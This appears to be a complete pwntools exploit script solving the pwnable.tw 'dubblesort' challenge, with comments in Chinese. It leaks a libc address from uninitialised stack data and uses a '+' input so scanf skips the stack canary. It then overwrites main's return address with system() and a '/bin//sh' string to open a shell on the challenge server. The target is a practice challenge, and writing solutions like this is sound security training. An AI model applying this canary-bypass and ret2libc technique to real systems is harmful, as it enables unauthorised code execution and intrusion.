#-*- coding: utf-8 -*- 
from pwn import *
import sys,os
context.arch = 'i386'
print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('chall.pwnable.tw',10101)
else:
    #r = remote('localhost',8888)
    #注意不同的shared library
    r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})




pad = 'x'*25
r.send(pad)
r.recvuntil('Hello ' + pad)
info = r.recv(3)
libc = u32(info.rjust(4,'\0')) - 0x1b0000
#dubblesort
print hex(libc)

#/bin//sh string
sh_addr = libc + 0x00158e8b
#rop gadget
system =  libc + 0x0003a940
    
num = 36
r.recvuntil('How many numbers do you what to sort')
#r.interactive()
r.sendline(str(num))
for i in range(num):
    if i == 24:
        #scanf('%d') 遇到+時不會寫值
        msg = '+'
    elif i == 32:
        #main ret addr
        msg = str(system)
    elif i >= 33:
        #總共送三個參數給system
        msg = str(sh_addr)
    elif i >= 25:
        msg = str(libc)
    else:
        msg = str(i)
    r.recvuntil('Enter')
    r.sendline(msg)
    print i
r.interactive()

